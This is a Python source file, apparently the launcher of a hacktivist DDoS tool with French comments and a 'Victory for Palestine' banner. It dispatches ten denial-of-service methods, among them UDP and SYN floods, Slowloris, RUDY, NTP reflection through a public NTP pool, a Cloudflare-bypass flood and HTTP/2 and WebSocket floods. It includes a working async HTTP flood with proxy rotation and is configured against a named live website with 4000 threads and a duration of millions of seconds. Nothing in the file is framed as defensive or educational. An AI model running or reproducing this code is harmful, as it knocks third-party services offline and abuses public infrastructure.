import threading
import sys
import asyncio
from core.udp_flood import udp_flood
from core.tcp_flood import syn_flood
from core.slowloris import slowloris
from core.rudyslayer import rudy_attack
from core.ntp_reflection import ntp_reflection_attack
from core.bypass_cloudflare import http_flood_bypass_cf
from core.layer7_http_flood import layer7_http_flood
from core.layer7_http2_flood import layer7_http2_flood
from core.layer7_websocket_flood import websocket_flood
from colorama import Fore, Style, init
import pyfiglet
import time
import random
import httpx

init(autoreset=True)

# ═══════════════════════════════════════════════════════════
# ⚙️  CONFIGURATION - MODIFIE CES VALEURS AVANT LANCEMENT  ⚙️
# ═══════════════════════════════════════════════════════════

METHOD = 7              # Méthode d'attaque (1 à 10) :
                        # 1=UDP Flood          6=NTP Reflection
                        # 2=SYN Flood          7=HTTP Bypass CF
                        # 3=HTTP Flood         8=Layer7 HTTP/1.1
                        # 4=Slowloris          9=Layer7 HTTP/2
                        # 5=RUDY              10=WebSocket Flood

TARGET = "https://senpai-stream.baby/"   # Cible : IP ou URL (ex: "192.168.1.1" ou "http://example.com")
PORT = 80                       # Port (utilisé pour méthodes 1,2,4,5,6)
DURATION = 6000000                   # Durée en secondes
THREADS = 4000                   # Nombre de threads / concurrence

# Options spécifiques (selon méthode)
NTP_SERVER = "0.pool.ntp.org"   # Requis pour méthode 6 (NTP Reflection)
PPS = 100                       # Packets/sec/thread pour NTP (méthode 6)

# ═══════════════════════════════════════════════════════════


# --- Async HTTP Flood code ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

PROXIES = []

def get_proxies():
    return PROXIES

async def send_request(target_url, proxy_url=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": "https://google.com",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    async with httpx.AsyncClient(timeout=10) as client:
        if proxy_url:
            response = await client.get(target_url, headers=headers, proxies=proxy_url)
        else:
            response = await client.get(target_url, headers=headers)
    return response.status_code

async def attack_worker(target_url, duration):
    timeout = time.time() + duration
    success = 0
    failure = 0
    proxies = get_proxies()
    while time.time() < timeout:
        proxy = None
        if proxies:
            proxy_str = random.choice(proxies)
            proxy = {"http://": proxy_str, "https://": proxy_str}
        try:
            status = await send_request(target_url, proxy_url=proxy)
            print(f"[HTTP Async] Status: {status}")
            success += 1
        except Exception as e:
            print(f"[HTTP Async] Error: {e}")
            failure += 1
    print(f"✓ Attack done: Success={success}, Failure={failure}")

async def http_flood(target_url, duration, concurrency):
    tasks = [asyncio.create_task(attack_worker(target_url, duration)) for _ in range(concurrency)]
    await asyncio.gather(*tasks)
# --- END Async HTTP Flood ---


def print_header():
    ascii_banner = pyfiglet.figlet_format("Victory for Palestine")
    print(Fore.GREEN + ascii_banner)
    print(Fore.YELLOW + Style.BRIGHT + "Islamic Electronic Resistance".center(80))
    print(Style.RESET_ALL)


def run_attack():
    print_header()
    print(f"{Fore.CYAN}[*] Lancement: Method={METHOD}, Target={TARGET}, Port={PORT}, Duration={DURATION}s, Threads={THREADS}{Style.RESET_ALL}\n")
    
    try:
        if METHOD == 1:  # UDP Flood
            print(f"🚀 UDP Flood sur {TARGET}:{PORT}")
            for _ in range(THREADS):
                t = threading.Thread(target=udp_flood, args=(TARGET, PORT, DURATION))
                t.start()
                
        elif METHOD == 2:  # SYN Flood
            print(f"🚀 SYN Flood sur {TARGET}:{PORT}")
            for _ in range(THREADS):
                t = threading.Thread(target=syn_flood, args=(TARGET, PORT, DURATION))
                t.start()
                
        elif METHOD == 3:  # HTTP Flood (async)
            print(f"🚀 HTTP Flood sur {TARGET}")
            asyncio.run(http_flood(TARGET, DURATION, THREADS))
            
        elif METHOD == 4:  # Slowloris
            print(f"🚀 Slowloris sur {TARGET}:{PORT}")
            for _ in range(THREADS):
                t = threading.Thread(target=slowloris, args=(TARGET, PORT, DURATION))
                t.start()
                
        elif METHOD == 5:  # RUDY
            print(f"🚀 RUDY sur {TARGET}:{PORT}")
            for _ in range(THREADS):
                t = threading.Thread(target=rudy_attack, args=(TARGET, PORT, DURATION))
                t.start()
                
        elif METHOD == 6:  # NTP Reflection
            print(f"🚀 NTP Reflection via {NTP_SERVER} vers {TARGET}")
            ntp_reflection_attack(TARGET, NTP_SERVER, 123, DURATION, THREADS, PPS)
            
        elif METHOD == 7:  # HTTP Bypass CF
            print(f"🚀 HTTP Flood (Bypass CF) sur {TARGET}")
            for _ in range(THREADS):
                t = threading.Thread(target=http_flood_bypass_cf, args=(TARGET, DURATION))
                t.start()
                
        elif METHOD == 8:  # Layer7 HTTP/1.1
            print(f"🚀 Layer7 HTTP/1.1 sur {TARGET}")
            for _ in range(THREADS):
                t = threading.Thread(target=layer7_http_flood, args=(TARGET, DURATION))
                t.start()
                
        elif METHOD == 9:  # Layer7 HTTP/2
            print(f"🚀 Layer7 HTTP/2 sur {TARGET}")
            for _ in range(THREADS):
                t = threading.Thread(target=layer7_http2_flood, args=(TARGET, DURATION))
                t.start()
                
        elif METHOD == 10:  # WebSocket Flood
            print(f"🚀 WebSocket Flood sur {TARGET}")
            for _ in range(THREADS):
                t = threading.Thread(target=websocket_flood, args=(TARGET, DURATION))
                t.start()
                
        else:
            print(f"{Fore.RED}[!] Méthode invalide: {METHOD}{Style.RESET_ALL}")
            sys.exit(1)
            
        # Wait for threading-based attacks to complete
        if METHOD != 3:  # HTTP Flood async already blocks
            time.sleep(DURATION + 3)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interruption manuelle{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur: {e}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    print(f"{Fore.GREEN}🚀 DDOS TOOL 2025 - Démarrage...{Style.RESET_ALL}")
    run_attack()